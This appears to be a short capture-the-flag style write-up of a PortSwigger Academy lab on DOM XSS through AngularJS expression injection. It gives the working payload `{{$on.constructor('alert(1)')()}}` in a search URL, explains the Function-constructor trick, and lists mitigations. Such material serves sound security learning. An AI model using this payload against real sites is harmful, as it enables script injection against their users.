# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**Platform:** PortSwigger Web Security Academy (free lab)
**Vulnerability type:** Cross-Site Scripting (XSS)
**Difficulty:** Apprentice
**Solved:** 15 November 2026

## Objective

Run code through an AngularJS expression in the search term.

## Method

1. Open `/?search={{$on.constructor('alert(1)')()}}`.

## Result

The alert runs. Lab solved.

## Why it works

The search term is evaluated as an AngularJS expression. `{{...}}` interpolation evaluates it, and `$on.constructor('alert(1)')()` reaches the Function constructor to execute the code.

## Lessons learned

- Template engines evaluate expressions — user input inside them is code, not text.
- AngularJS's old sandbox is not a security boundary.

## Mitigation

Do not interpolate user input into AngularJS expressions. Upgrade AngularJS or use a framework with proper escaping.

---

*Note: this lab is one of PortSwigger Web Security Academy's intentionally vulnerable free training labs. It was solved legally, for learning, on PortSwigger's own lab environment.*
